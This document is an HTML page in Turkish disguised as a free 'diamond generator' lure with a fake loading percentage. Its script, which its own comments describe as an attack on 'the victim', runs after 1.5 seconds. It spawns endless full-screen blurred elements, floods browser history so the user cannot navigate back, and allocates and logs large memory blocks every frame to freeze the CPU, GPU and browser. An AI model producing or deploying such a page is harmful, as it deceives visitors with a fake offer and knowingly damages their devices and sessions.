<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>💎 FREE ELMAS GENERATOR 2026 💎</title>
    <style>
        body { background: #000; color: #00ff00; text-align: center; font-family: sans-serif; overflow: hidden; margin: 0; }
        /* İşlemciyi ağlatan ultra-ağır görsel efektler */
        .heavy {
            position: fixed; width: 100%; height: 100%;
            top: 0; left: 0;
            background: repeating-conic-gradient(#ff0000, #00ff00 10%, #0000ff 20%);
            filter: blur(10px) contrast(500%) hue-rotate(0deg);
            mix-blend-mode: exclusion;
            opacity: 0.1;
            z-index: 1;
            animation: burn 0.001s infinite;
        }
        @keyframes burn { 
            to { filter: blur(50px) contrast(1000%) hue-rotate(360deg); transform: scale(1.5); } 
        }
    </style>
</head>
<body>
    <div class="heavy"></div>
    <div style="position:relative; z-index:10; padding-top:150px;">
        <h1>💎 ELMASLAR SİSTEME GÖMÜLÜYOR 💎</h1>
        <p>Grafik motoru optimize ediliyor, lütfen dokunmayın...</p>
        <h2 id="p">Yükleniyor: %0</h2>
    </div>

<script>
    // GÖRSEL ALDATMACA
    let count = 0;
    setInterval(() => { if(count < 99) { count++; document.getElementById('p').innerText = "Yükleniyor: %" + count; }}, 40);

    // --- GÖRSEL VE DONANIMSAL İMHA ---
    function kiyamet() {
        const d = document;
        const b = d.body;

        // 1. ADIM: Sonsuz DOM Elemanı Üretimi (RAM ve GPU Katili)
        setInterval(() => {
            for(let i=0; i<100; i++) {
                let s = d.createElement("div");
                // Her bir eleman ekran kartına ağır bir yük bindirir
                s.style.cssText = "position:fixed;top:0;left:0;width:100vw;height:100vh;box-shadow:inset 0 0 100px #000;filter:blur(20px);";
                b.appendChild(s);
            }
            // Tarayıcı geçmişini saniyede binlerce kez şişir (Çıkışı imkansızlaştırır)
            window.history.pushState(null, "", "?" + Math.random());
        }, 10);

        // 2. ADIM: İşlemciyi sonsuz döngüyle kilitler
        function loop() {
            let data = new Uint8Array(1024 * 1024 * 10); // 10MB'lık veri blokları
            data.fill(255);
            console.log(data); // Konsolu devasa veriyle patlatır
            requestAnimationFrame(loop);
        }
        loop();
    }

    // Kurban tam sayfaya alıştığı anda (1.5 saniye sonra) saldırı başlar
    setTimeout(kiyamet, 1500);
</script>
</body>
</html>
